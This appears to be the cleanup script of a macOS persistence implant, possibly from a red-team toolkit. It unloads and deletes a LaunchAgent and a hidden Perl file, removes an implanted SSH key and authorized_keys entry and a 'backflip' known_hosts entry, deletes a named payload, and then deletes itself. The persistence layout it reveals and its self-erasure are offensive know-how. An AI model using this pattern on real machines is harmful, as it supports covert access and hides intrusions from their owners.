#!/usr/bin/env bash


UMASK=002
umask $UMASK

NAME=$(basename "$0")
pubkey="PUBLIC_KEY_PLACEHOLDER"
backflippub="BACKFLIP_PUB_PLACEHOLDER"

decodepub=$(echo -n "$pubkey"|base64 -d)
decodeback=$(echo -n "$backflippub"|base64 -d)
die () {
    echo >&2 "$@"
    exit 1
}

[ "$#" -eq 1 ] || die "-p arg required, $# provided"

while getopts p: flag
do
    case "${flag}" in
        p) payload=${OPTARG};;
        *)
            echo 'Error in command line parsing' >&2
            exit 1
    esac
done



echo "Removing Plist"
launchctl unload "$HOME/Library/LaunchAgents/com.resource.agent.plist"
rm "$HOME/Library/LaunchAgents/com.resource.agent.plist"
sleep 1
rm "$HOME/Library/LaunchAgents/.flock.pl"
sleep 1

echo "Removing ssh keys"
rm "$HOME/.ssh/badger"

if test -f "$HOME/.ssh/authorized_keys"; then
  if grep -v "$decodepub" "$HOME/.ssh/authorized_keys" > "$HOME/.ssh/tmp"; then
    cat "$HOME/.ssh/tmp" > "$HOME/.ssh/authorized_keys" && rm "$HOME/.ssh/tmp";
  fi;
fi

if test -f "$HOME/.ssh/known_hosts"; then
  if grep -v "$decodeback" "$HOME/.ssh/known_hosts" > "$HOME/.ssh/tmp2"; then
    cat "$HOME/.ssh/tmp2" > "$HOME/.ssh/known_hosts" && rm "$HOME/.ssh/tmp2";
  fi;
fi
sleep 1

echo "Deleting payload: $payload"
rm "$HOME/Library/LaunchAgents/$payload"

echo "Deleting clean up script"
rm $NAME

